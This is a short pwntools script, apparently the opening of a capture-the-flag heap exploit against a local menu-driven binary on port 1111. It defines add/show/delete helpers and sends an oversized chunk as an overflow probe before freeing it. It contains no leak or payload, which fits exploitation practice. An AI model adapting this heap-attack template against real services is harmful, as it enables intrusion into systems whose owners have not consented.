from pwn import *

context(arch='amd64', log_level='debug')

r = remote('localhost', 1111)

def add(idx, size, content):
    r.sendlineafter('>> ', '1')
    r.sendlineafter('IDX : ', str(idx))
    r.sendlineafter('SIZE : ', str(size))
    r.sendafter('CONTENT: ', content)

def show(idx):
    r.sendlineafter('>> ', '2')
    r.sendlineafter('IDX : ', str(idx))

def delete(idx):
    r.sendlineafter('>> ', '3')
    r.sendlineafter('IDX : ', str(idx))

def take_flag():
    r.sendlineafter('>> ', '4')

add(0, 0x68, b'a'*0x70)
delete(0)

r.interactive()
